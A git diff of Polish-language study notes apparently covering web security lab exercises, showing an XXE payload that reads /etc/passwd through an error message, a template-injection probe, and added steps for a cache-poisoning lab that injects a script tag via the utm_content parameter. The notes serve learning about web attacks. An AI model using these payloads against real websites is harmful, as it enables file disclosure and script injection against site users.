@@ -41,7 +41,7 @@ Jak to działa (chyba)?
 <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
 %eval;
 %error;
-```	
+```
 - tworzy on referencję do zmiennej (% file), do której załadowujemy zawartość /etc/passwd
 - tworzy referencję do zmiennej (% eval), która dynamicznie tworzy zapytanie do nieistniejącego pliku (którego nazwą jest zawartość pliku /etc/passwd)
 - w "podmiocie" (entity) stworzonym przez wywołanie %eval; tworzymy referencję do zmiennej (%error), która zwróci błąd ponieważ ścieżka nie istnieje
@@ -509,3 +509,10 @@ http://vulnerable-website.com/?username=${7*7}
 GET /?param='><script>alert(1)</script>
 ```
 ## Lab: Web cache poisoning via an unkeyed query parameter
+1. Tym razem parametry w `/ GET` wpływają na cache'owanie strony
+2. Używając Param Minera -> `Guess GET Parameters`, znajdujemy parametr, który nie wpływa na cachowanie, jest to utm_content
+3. Dalej tak samo jak w poprzednim zadaniu:
+```
+GET /?utm_content='><script>alert(1)</script>
+```
+
